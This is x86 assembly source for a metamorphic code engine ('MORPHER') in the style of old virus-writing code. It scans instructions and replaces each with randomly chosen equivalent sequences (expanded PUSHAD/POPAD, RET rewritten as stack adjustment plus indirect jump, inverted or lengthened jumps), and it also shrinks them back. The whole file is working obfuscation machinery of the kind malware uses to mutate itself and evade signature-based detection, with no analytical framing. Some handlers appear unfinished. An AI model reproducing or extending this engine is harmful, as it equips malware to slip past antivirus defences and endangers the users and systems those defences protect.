MORPHER	Proc					;start of morpher code
i1	pushad

i3	lea	edi,[ebp+instructionz-gdelta]	;ptr to list of supported instructionz
i3	xchg	esi,edi

analyse_instruction:
i1	lodsd					;get ptr to morpher routine
i3	test	eax,eax
i2	je	end_MORPHER			;quit if NULL
i3	add	eax,ebp				;normalize
i3	xchg	eax,edx				;to EDX...

explore_instruction:
i3	xor	eax,eax
i1	lodsb					;get the counter-byte
i3	test	al,al
i2	je	end_instruction			;finish if end of instruction
i2	js	sign_test			;correct valuez if signed

i2	push	edi
i2	dec	eax
i3	add	edi,eax
i1	cmpsb					;compare one byte
i2	pop	edi
i2	je	explore_instruction		;if matchez, continue

next_instruction:
i1	lodsb
i3	test	al,al
i2	jne	next_instruction		;go to the end of instruction
i2	jmp	analyse_instruction		;and analyse next instruction

sign_test:
i2	push	edi
i2	neg	al				;un-sign
i2	dec	eax
i3	add	edi,eax
i1	lodsb
i3	mov	bl,[edi]			;read one byte
i3	and	bl,-8				;convert EXX -> EAX
i3	cmp	al,bl				;and compare bytez
i2	pop	edi
i2	je	explore_instruction		;if matchez, compare next bytez
i2	jmp	next_instruction		;if not, go to next instruction

end_instruction:
i3	mov	edi,[esp.Pushad_esi]
i2	push	edi
i2	call	edx				;call the instruction-morpher-handler
i2	pop	ecx
i3	sub	ecx,edi				;move count of written bytez to ECX
i2	jecxz	e_morpher
i3	add	ecx,MAXINSTRLENGTH		;normalize
e_morpher:
i3	mov	[esp.Pushad_ecx],ecx		;save it
end_MORPHER:
i1	popad
i1	ret


;---------------------------------------
;instruction handler syntax:
;
;input:  EDI	- offset of instruction
;output: [EDI]	- new instruction
;
;---------------------------------------
;shr_XXX:	;shrinker code
;
;...
;
;ret
;
;---------------------------------------
;exp_XXX:	;expander code
;
;...
;
;ret
;
;---------------------------------------



;-------- PUSHAD --------

shr_pushad:
i3	mov	al,60h				;write single PUSHAD opcode
stosb_ret:
i1	stosb
i1	ret

exp_pushad:
i2	push	8				;write	PUSH EAX
i2	pop	ecx				;	PUSH ECX
i3	mov	al,50h				;	...
l_pushad2:					;	PUSH EDI
i1	stosb
i2	inc	eax
i2	loop	l_pushad2
i1	ret

;-------- POPAD --------

shr_popad:
i3	mov	al,61h				;write single POPAD opcode
i2	jmp	stosb_ret

exp_popad:
i2	push	8				;write	POP EDI
i2	pop	ecx				;	POP ESI
i3	mov	al,5Fh				;	...
l_popad2:					;	POP EAX
i1	stosb
i2	dec	eax
i2	loop	l_popad2
i1	ret

;-------- MOV	EXX,XXXXXXXX --------

shr_movexx:
i3	mov	al,[edi]			;shrink to original state
i1	stosb
i3	mov	eax,[edi]
i2o1	movzx	ecx,byte ptr [edi+5]
i3	and	cl,8
i2	jecxz	l_movexx3
i2	neg	eax
stosd_ret:
i1	stosd
i1	ret
l_movexx3:
i2	not	eax
i2	jmp	stosd_ret
shr_movexx2:
i3	mov	al,[edi+1]
i3	add	al,0B8h-0C0h
i1	stosb
i3	mov	eax,[edi+1]
i2	jmp	stosd_ret

exp_movexx:
i3	mov	al,[edi]
i2	push	eax
i1	stosb
i2	push	3
i2	call	RANDOM				;get rnd number <0,1>
i1	cdq
i2	dec	eax
i2	je	l_movexx1
i2	dec	eax
i2	je	l_movexx5
i3	mov	eax,[edi]			;create MOV	EXX,not XXXXXXXX
i2	not	eax				;	NOT	EXX
l_movexx2:
i1	stosd
i3	mov	al,0F7h
i1	stosb
i2	pop	eax
i3	add	al,0D0h-0B8h
i3	add	al,dl
i2	jmp	stosb_ret
l_movexx1:					;create MOV	EXX,-XXXXXXXX
i3	mov	eax,[edi]			;	NEG	EXX
i2	neg	eax
i3	add	dl,8
i2	jmp	l_movexx2
l_movexx5:
i2	dec	edi				;create MOv	EXX,XXXXXXXXh
i3	mov	al,0C7h				;	(larger variant)
i1	stosb
i2	pop	eax
i3	add	al,0C0h-0B8h
i3	mov	ebx,[edi]
i1	stosb
i3	xchg	eax,ebx
i2	jmp	stosd_ret


;-------- INC	EXX/XX --------

shr_incb:
i3	mov	cl,80h				;shrink to INC	XX
i2	jmp	@shr_inc
shr_inc:
i3	mov	cl,83h				;shrink to INC	EXX
@shr_inc:
i3	mov	al,[edi+1]
i3	lea	edx,[edi+2]
i1o2	cmp	byte ptr [edx],1
i2	je	shr_inc1
i1o2	cmp	byte ptr [edx],-1
i2	je	shr_inc2
i3	mov	[edi],cl
i2	inc	edi
i3	add	al,0e8h-0c0h
@exp_subs:
i1	stosb
i1o1	neg	byte ptr [edx]
i2	inc	edi
i1	ret
shr_inc1:
i3	cmp	cl,83h
i2	jecxz	shr_inc1x
i3	mov	al,0FEh
i1	stosb
shr_inc1x:
i3	add	al,40h-0C0h
i2	jmp	stosb_ret
shr_inc2:
i3	cmp	cl,83h
i2	jecxz	shr_inc2x
i3	mov	al,0FEh
i1	stosb
shr_inc2x:
i3	add	al,48h-0C0h
i2	jmp	stosb_ret

exp_inc:
i3	mov	al,[edi]
i2	push	eax
i3	mov	al,83h
i1	stosb
i2	call	RANDOM2				;get rnd number <0,1>
i2	dec	eax
i2	pop	eax
i2	je	l_inc1
i3	add	al,0C0h-40h			;create ADD	EXX,1
l_dec2:
i1	stosb
i3	mov	al,1
i2	jmp	stosb_ret
l_inc1:
i3	add	al,0E8h-40h			;create SUB	EXX,-1
l_dec3:
i1	stosb
i3	mov	al,-1
i2	jmp	stosb_ret

;-------- DEC	EXX --------

shr_decb:
i3	mov	cl,80h				;shrink to DEC	XX
i2	jmp	@shr_dec
shr_dec:
i3	mov	cl,83h				;shrink to DEC	EXX
@shr_dec:
i3	mov	al,[edi+1]
i3	lea	edx,[edi+2]
i1o2	cmp	byte ptr [edx],1
i2	je	shr_dec1
i1o2	cmp	byte ptr [edx],-1
i2	je	shr_dec2
i2	inc	edi
i3	add	al,0c0h-0e8h
i2	jmp	@exp_subs
shr_dec1:
i3	add	al,48h-0E8h
i2	jmp	stosb_ret
shr_dec2:
i3	add	al,40h-0E8h
i2	jmp	stosb_ret

exp_dec:
i3	mov	al,[edi]
i2	push	eax
i3	mov	al,83h
i1	stosb
i2	call	RANDOM2				;get rnd number <0,1>
i2	dec	eax
i2	pop	eax
i2	je	l_dec1
i3	add	al,0E8h-48h			;create SUB	EXX,1
i2	jmp	l_dec2
l_dec1:
i3	add	al,0C0h-48h			;create ADD	EXX,-1
i2	jmp	l_dec3


;test if JUMP can be enshorted.
;input:		EAX	- displacement
;output:	CF set	- displacement is too big for enshortment

test_jmp	Proc
i3	mov	edx,eax
i3	xor	dl,dl
i3	cmp	edx,0FFFFFF00h
i2	je	l_test_jmp
i3	test	edx,edx
i2	jne	e_test_jmp
i3	test	al,al
i2	js	e_test_jmp
i2	jmp	ok_test_jmp
l_test_jmp:
i3	test	al,al
i2	jns	e_test_jmp
ok_test_jmp:
i1	clc
i1	ret
e_test_jmp:
i1	stc
i1	ret
test_jmp	EndP

;-------- JMP	LARGE XXXXXXXX --------

shr_ljmp1:
i3	mov	eax,[edi+1]			;shrink to JMP	SHORT XX
i3	add	eax,3
i2	call	test_jmp
i2	jc	e_shr_ljmp			;cant shrink, quit...
i3	rol	eax,8
i3	mov	al,0EBh
stosw_ret:
i1	stosw
e_shr_ljmp:
i1	ret

shr_ljmp2:
i2o1	movzx	edx,byte ptr [edi+3]
i3	mov	esi,1
i3	mov	ebx,2
@shr_ljmp3:
i2	call	RANDOM2				;get rnd number <0,1>
i2	dec	eax
i2	je	@shr_ljmp2
i3	mov	al,0E9h				;create JMP	LARGE XXXXXXXX
i1	stosb
i3	xchg	eax,edx
i3	sub	eax,esi
i2	jmp	stosd_ret
@shr_ljmp2:
i2	inc	edi				;create JMP	SHORT XX
i3	xchg	eax,edx
i3	add	eax,ebx
i2	call	test_jmp
i2	jnc	stosb_ret
i1	ret

shr_ljmp3:
i3	mov	esi,-2
i3	mov	ebx,5
i3	mov	edx,[edi+3]
i2	jmp	@shr_ljmp3

exp_ljmp:
i2	call	RANDOM2				;get rnd number <0,1>
i2	dec	eax
i2	je	l_exp_ljmp
i3	mov	eax,[edi+1]			;create JMP	@1
i2	inc	eax				;@2:	JMP	SHORT XX
i2	call	test_jmp			;@1:	JMP	@2
i2	jc	l_exp_ljmp
@l_exp_ljmp:
i3	rol	eax,24
i3	add	eax,0EB02EBh
i1	stosd
i1	stosb
i3	mov	al,-4
i2	jmp	stosb_ret
l_exp_ljmp:
i3	mov	edx,[edi+1]			;create JMP	@1
i3	sub	edx,2				;@2:	JMP	LARGE XXXXXXXX
i3	mov	eax,0E905EBh			;@1:	JMP	@2
i1	stosd
i2	dec	edi
i3	xchg	eax,edx
i1	stosd
i3	mov	al,0EBh
i1	stosb
i3	mov	al,-7
i2	jmp	stosb_ret

;-------- JMP	SHORT XX --------

exp_sjmp:
i2o1	movsx	edx,byte ptr [edi+1]		;create JMP	LARGE XXXXXXXX
i3	sub	edx,3
i3	mov	al,0E9h
i1	stosb
i3	xchg	eax,edx
i2	jmp	stosd_ret

;-------- JX(X)	SHORT XX --------

shr_sjxx1:
i3	mov	eax,[edi+2]			;shrink to JX(X)	SHORT XX
i3	add	eax,4
i2	call	test_jmp
i2	jnc	@shr_sjxx1
i1	ret
@shr_sjxx1:
i2	push	eax
i3	mov	al,[edi+1]
i3	add	al,70h-80h
i1	stosb
i2	pop	eax	
i2	jmp	stosb_ret

shr_sjxx2:
i3	mov	eax,[edi+3]			;shrink to JX(X)	SHORT XX
i3	add	eax,5
i2	push	eax
i2	call	test_jmp
i2	jnc	@shr_sjxx4

i3	mov	al,0Fh
i3	mov	ah,[edi]
i3	add	ah,80h-70h
i3	test	ah,1
i2	jne	@shr_sjxx5
i2	inc	ah
i2	jmp	@shr_sjxx6
@shr_sjxx5:
i2	dec	ah
@shr_sjxx6:
i1	stosw
i2	pop	eax
i3	sub	eax,4
i2	jmp	stosd_ret
@shr_sjxx4:
i3	mov	al,[edi]
i3	test	al,1
i2	jne	@shr_sjxx7
i2	inc	al
i2	jmp	@shr_sjxx8
@shr_sjxx7:
i2	dec	al
@shr_sjxx8:
i1	stosb
i2	pop	eax
i2	jmp	stosb_ret

shr_sjxx3:					;shrink to JX(X)	SHORT XX
i1o2	mov	byte ptr [edi+1],05h
i1o2	mov	byte ptr [edi+2],0E9h
i2o1	movzx	eax,byte ptr [edi+3]
i3	sub	eax,3
i3	mov	[edi+3],eax
i2	jmp	shr_sjxx2

exp_sjxx:
i2	call	RANDOM2				;get rnd number <0,1>
i2	dec	eax
i2	je	exp_sjxx1
i2o1	movzx	eax,byte ptr [edi+1]
i2	push	eax
i3	mov	al,[edi]
i3	test	al,1
i2	je	@exp_sjxx1
i2	dec	al
i2	jmp	@exp_sjxx2
@exp_sjxx1:
i2	inc	al
@exp_sjxx2:
i1	stosb
i2	call	RANDOM2				;get rnd number <0,1>
i2	dec	eax
i2	je	@exp_sjxx3
@exp_sjxx4:
i3	mov	al,05h				;create JX(X)'	@1
i1	stosb					;	JMP	LARGE XXXXXXXX
i3	mov	al,0E9h				;@1:	...
i1	stosb
i2	pop	eax
i3	sub	eax,5
i2	jmp	stosd_ret
@exp_sjxx3:
i2	pop	eax				;create JX(X)'	@1
i2	push	eax				;	JMP	SHORT XX
i3	sub	eax,2				;@1:	...
i2	call	test_jmp
i2	jc	@exp_sjxx4
i3	mov	al,02h
i1	stosb
i3	mov	al,0EBh
i1	stosb
i2	pop	eax
i3	sub	eax,2
i2	jmp	stosb_ret

exp_sjxx1:
i3	mov	dl,[edi]			;create JX(X)	LARGE XXXXXXXX
i2o1	movsx	ebx,byte ptr [edi+1]
i3	sub	ebx,4
i3	mov	ax,100Fh
i3	add	ah,dl
i1	stosw
i3	xchg	eax,ebx
i2	jmp	stosd_ret

;-------- RET --------

shr_ret:
i3	mov	al,0C3h				;shrink to RET
i2	jmp	stosb_ret

exp_ret:
i2	call	RANDOM2				;get rnd number <0,1>
i2	dec	eax
i2	je	@exp_ret1
i3	mov	eax,0FF04C483h			;create ADD	ESP,4
i2	jmp	@exp_ret2			;	JMP	[ESP-4]
@exp_ret1:
i3	mov	eax,0FFFCEC83h			;create SUB	ESP,-4
@exp_ret2:					;	JMP	[ESP-4]
i1	stosd
i3	mov	ax,2464h
i1	stosw
i3	mov	al,0FCh
i2	jmp	stosb_ret

;-------- RET	XXXX --------

shr_retx:
i3	mov	al,0C2h				;shrink to RET	XXXX
i1	stosb
i2o1	movzx	eax,byte ptr [edi+5]
i2	neg	al
i2	jmp	stosw_ret

exp_retx:
i2o1	movzx	edx,word ptr [edi+1]
i3	test	dl,dl
i2	jns	c_exp_retx1			;mustnt be >128
end_exp_retx:
i1	ret
c_exp_retx1:
i3	test	dh,dh
i2	jne	end_exp_retx			;mustnt be >255
i3	mov	al,83h
i1	stosb
i2	call	RANDOM2				;get rnd number <0,1>
i2	dec	eax
i2	je	@exp_retx1
i3	mov	al,0C4h				;create ADD	ESP,4+XX
i1	stosb					;	JMP	[ESP-4]
i3	mov	al,dl
i2	jmp	@exp_retx2
@exp_retx1:
i3	mov	al,0ECh				;create SUB	ESP,-4-XX
i1	stosb					;	JMP	[ESP-4]
i3	mov	al,dl
i2	neg	al
@exp_retx2:
i1	stosb
i3	mov	ax,64FFh
i1	stosw
i3	mov	ah,dl
i2	neg	ah
i3	mov	al,24h
i2	jmp	stosw_ret

;-------- CALL	XXXXXXXX --------

shr_call:
i3	mov	al,0E8h				;shrink to CALL	XXXXXXXX
i1	stosb
i3	mov	eax,[edi+2]
i3	add	eax,2
i2	jmp	stosd_ret

exp_call:
i1o1	push	dword ptr [edi+1]
i2	push	8
i2	call	RANDOM				;get rnd number <0,7>
i3	xchg	eax,edx
i3	mov	al,50h				;create PUSH	EXX
i3	add	al,dl				;	POP	EXX
i1	stosb					;	CALL	XXXXXXXX
i3	mov	al,58h
i3	add	al,dl
i1	stosb
i3	mov	al,0E8h
i1	stosb
i2	pop	eax
i3	sub	eax,2
i2	jmp	stosd_ret

;-------- JECXZ	XX --------

shr_jecxz1:
i3	mov	al,0E3h				;shrink to JECXZ	XX
i1	stosb
i2o1	movsx	eax,byte ptr [edi+2]
i3	add	eax,2
i2	jmp	stosb_ret
shr_jecxz2:
i3	mov	al,0E3h				;shrink to JECXZ	XX
i1	stosb
i2o1	movsx	eax,byte ptr [edi+3]
i3	add	eax,6
i2	jmp	stosb_ret

exp_jecxz:
i2o1	movsx	edx,byte ptr [edi+1]
i3	mov	ax,0C985h			;create TEST	ECX,ECX
i1	stosw
i2	call	RANDOM2				;get rnd number <0,1>
i2	dec	eax
i2	je	@exp_jecxz1
i3	mov	al,74h				;create JE	SHORT XX
i1	stosb
i3	xchg	eax,edx
i3	sub	eax,2
i2	call	test_jmp
i2	jnc	stosb_ret
i2	dec	edi
i3	add	eax,2
i3	xchg	eax,edx
@exp_jecxz1:
i3	mov	ax,840Fh			;create JE	LARGE XXXXXXXX
i1	stosw
i3	xchg	eax,edx
i3	sub	eax,6
i2	jmp	stosd_ret

;-------- ADD	EAX,XXXXXXXX --------

exp_addeax:
i1o2	mov	byte ptr [edi],2Dh		;create SUB	EAX,-XXXXXXXX
@exp_subeax:
i1o1	neg	dword ptr [edi+1]
i3	add	edi,5
i1	ret

;-------- SUB	EAX,XXXXXXXX --------

exp_subeax:
i1o2	mov	byte ptr [edi],05h		;create ADD	EAX,-XXXXXXXX
i2	jmp	@exp_subeax

;-------- ADD	EXX,XXXXXXXX --------

exp_add:
i1o2	add	byte ptr [edi+1],0e8h-0c0h	;create SUB	EXX,-XXXXXXXX
@exp_sub:
i1o1	neg	dword ptr [edi+2]
i3	add	edi,6
i1	ret

;-------- SUB	EXX,XXXXXXXX --------

exp_sub:
i1o2	add	byte ptr [edi+1],0c0h-0e8h	;create ADD	EXX,-XXXXXXXX
i2	jmp	@exp_sub

;-------- STOSB --------

shr_stosb:
i3	mov	al,0AAh				;shrink to STOSB
i2	jmp	stosb_ret

exp_stosb:
i2	call	RANDOM2				;get rnd number <0,1>
i2	dec	eax
i2	je	@exp_stosb
i3	mov	eax,470788h			;create MOV	[EDI],AL
stosd_dec_edi_ret:
i1	stosd					;	INC	EDI
i2	dec	edi
i1	ret
@exp_stosb:
i3	mov	ax,0AA66h			;create	DB	66h
i2	jmp	stosw_ret			;	STOSB

;-------- STOSW --------

shr_stosw:
i3	mov	ax,0AB66h			;shrink to STOSW
i2	jmp	stosw_ret

exp_stosw:
i3	mov	eax,083078966h			;create MOV	[EDI],AX
i1	stosd					;	ADD	EDI,2
i3	mov	ax,02C7h
i2	jmp	stosw_ret

;-------- STOSD --------

shr_stosd:
i3	mov	al,0ABh				;shrink to STOSD
i2	jmp	stosb_ret

exp_stosd:
i3	mov	eax,0C7830789h			;create	MOV	[EDI],EAX
i1	stosd					;	ADD	EDI,4
i3	mov	al,4
i2	jmp	stosb_ret

;-------- LODSB --------

shr_lodsb:
i3	mov	al,0ACh
i2	jmp	stosb_ret

exp_lodsb:
i2	call	RANDOM2				;get rnd number <0,1>
i2	dec	eax
i2	je	@exp_lodsb
i3	mov	eax,46068Bh
i2	jmp	stosd_dec_edi_ret
@exp_lodsb:
i3	mov	ax,0AC66h
i2	jmp	stosw_ret

;-------- LODSD --------

shr_lodsd:
i3	mov	al,0ADh
i2	jmp	stosb_ret

exp_lodsd:
i3	mov	eax,0C683068Bh
i1	stosd
i3	mov	al,4
i2	jmp	stosb_ret

;-------- PUSH EXX --------

shr_pushexx:
i3	mov	al,[edi+1]
i3	add	al,50h-0F0h
i2	jmp	stosb_ret

exp_pushexx:
i1o1	push	dword ptr [edi]
i3	mov	al,0FFh
i1	stosb
i2	pop	eax
i3	add	al,0F0h-50h
i2	jmp	stosb_ret

;-------- POP EXX --------

shr_popexx:
i3	mov	al,[edi+1]
i3	add	al,58h-0C0h
i2	jmp	stosb_ret

exp_popexx:
i1o1	push	dword ptr [edi]
i3	mov	al,08Fh
i1	stosb
i2	pop	eax
i3	add	al,0C0h-58h
i2	jmp	stosb_ret

;-------- MOV --------

exp_mov:
i3	mov	al,[edi+1]
i3	mov	dl,al
i3	and	al,0C0h
i3	cmp	al,0C0h
i2	je	@exp_mov1			;reg1,reg2
;i2	int	3
i3	mov	al,dl
i3	and	al,80h
i3	cmp	al,80h
i2	je	@exp_mov2			;reg,mem32

i1	ret


@exp_mov1:
i3	mov	dh,dl
i3	and	dl,00000111b			;1st register
i3	and	dh,00111000b			;2nd register
i3	shr	dh,3				;normalize
i3	mov	bl,[edi]
i3	and	bl,1				;BL = size of register (b/w)
@exp_movL:
i2	push	3
i2	call	RANDOM				;get rnd number <0,2>
i2	dec	eax
i2	je	@exp_mov11
i2	dec	eax
i2	je	@exp_mov12
i3	mov	al,[edi]			;create MOV	reg1,reg2
i3	test	al,2
i2	je	exp_mov1x
i3	sub	al,2
i2	jmp	exp_mov1y
exp_mov1x:
i3	add	al,2
exp_mov1y:
i1	stosb
create_op_regz:
i3	mov	al,11000000b
i3	shl	dl,3
i3	add	al,dl
i3	add	al,dh
i2	jmp	stosb_ret
@exp_mov11:
i3	test	bl,bl				;create PUSH	reg2
i2	je	@exp_movL			;	XCHG	reg1,reg2
i2	call	create_push_reg			;	POP	reg2
i3	mov	al,58h
i3	add	al,dh
i2	jmp	stosb_ret
create_push_reg:
i3	mov	al,50h
i3	add	al,dl
i1	stosb
i1	ret
@exp_mov12:
i2	call	create_push_reg			;create PUSH	reg2
i3	mov	al,86h				;	POP	reg1
i3	add	al,bl
i1	stosb
i2	push	edx
i2	call	create_op_regz
i2	pop	edx
i3	mov	al,58h
i3	add	al,dl
i2	jmp	stosb_ret

@exp_mov2:
i3	mov	al,dl
i3	and	al,7
i1	ret

MORPHER	EndP
